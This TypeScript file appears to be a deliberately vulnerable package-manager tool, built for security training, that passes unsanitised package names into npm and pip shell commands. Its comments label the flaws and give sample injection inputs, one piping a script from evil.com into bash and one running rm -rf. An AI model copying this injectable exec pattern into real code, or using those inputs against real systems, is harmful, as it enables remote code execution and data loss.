import { exec } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

/**
 * Dependency manager for npm and pip packages
 * 
 * 🚨 VULNERABILITIES:
 * - SEC-002: Command Injection - package names not sanitized
 * - SEC-011: Vulnerable Dependencies - installs old versions
 * - SEC-003: Input Validation - no package name validation
 */
export async function dependencyManager(action: string, packageName: string) {
  console.error(`Dependency ${action}: ${packageName}`);

  try {
    switch (action) {
      case "install":
        return await installPackage(packageName);
      case "update":
        return await updatePackage(packageName);
      default:
        throw new Error(`Unknown action: ${action}`);
    }
  } catch (error: any) {
    console.error("Dependency operation error:", error);
    return {
      content: [
        {
          type: "text",
          text: `Dependency operation failed: ${error.message}\n\nOutput: ${error.stdout}\n\nError: ${error.stderr}`,
        },
      ],
      isError: true,
    };
  }
}

async function installPackage(packageName: string) {
  // 🚨 SEC-003: Input Validation Failure
  // No validation of package name format
  // No check if package exists or is from trusted registry
  
  // 🚨 SEC-002: Command Injection Vulnerability
  // Package name is directly interpolated into shell command
  // Attacker could input: "lodash && curl evil.com/malware.sh | bash"
  // Or: "express; rm -rf node_modules"
  // Should use npm programmatic API or properly escape arguments
  
  // 🚨 SEC-011: Vulnerable Dependencies
  // Installing without version specification may pull vulnerable versions
  // Not checking for known CVEs before installation
  // Example: installing old versions of lodash, moment, etc.
  
  const command = `npm install ${packageName}`;
  
  console.error(`Installing package: ${packageName}`);
  console.error(`Command: ${command}`);

  const { stdout, stderr } = await execAsync(command, {
    // 🚨 SEC-008: Missing Timeout
    // No timeout on npm install - malicious packages can hang indefinitely
    // timeout: undefined (should be set to reasonable limit)
  });

  // 🚨 SEC-004: Information Disclosure
  // NPM output may contain registry URLs, tokens, or internal paths
  console.error("Install output:", stdout);

  return {
    content: [
      {
        type: "text",
        text: `Package installed successfully:\n\n${stdout}\n${stderr ? `\nWarnings:\n${stderr}` : ""}`,
      },
    ],
  };
}

async function updatePackage(packageName: string) {
  // 🚨 SEC-002: Command Injection
  // Same vulnerability as install
  // Package name not sanitized
  
  // 🚨 SEC-011: Vulnerable Dependencies
  // Updates to latest may still be vulnerable if:
  // - Package maintainer is malicious
  // - Latest version has undiscovered vulnerabilities
  // - Supply chain attack (compromised package)
  // Should check npm audit before updating
  
  const command = `npm update ${packageName}`;
  
  console.error(`Updating package: ${packageName}`);

  const { stdout, stderr } = await execAsync(command);

  // Check if we should also run pip update
  const isPythonPackage = packageName.includes("-") || packageName.toLowerCase() === packageName;
  
  if (isPythonPackage) {
    try {
      // 🚨 SEC-002: Same command injection vulnerability for pip
      const pipCommand = `pip install --upgrade ${packageName}`;
      const pipResult = await execAsync(pipCommand);
      
      return {
        content: [
          {
            type: "text",
            text: `Package updated (tried both npm and pip):\n\nNPM:\n${stdout}\n\nPip:\n${pipResult.stdout}`,
          },
        ],
      };
    } catch (pipError: any) {
      // Python package not found, return npm result
      return {
        content: [
          {
            type: "text",
            text: `Package updated (npm only):\n\n${stdout}\n${stderr ? `\nWarnings:\n${stderr}` : ""}`,
          },
        ],
      };
    }
  }

  return {
    content: [
      {
        type: "text",
        text: `Package updated:\n\n${stdout}\n${stderr ? `\nWarnings:\n${stderr}` : ""}`,
      },
    ],
  };
}
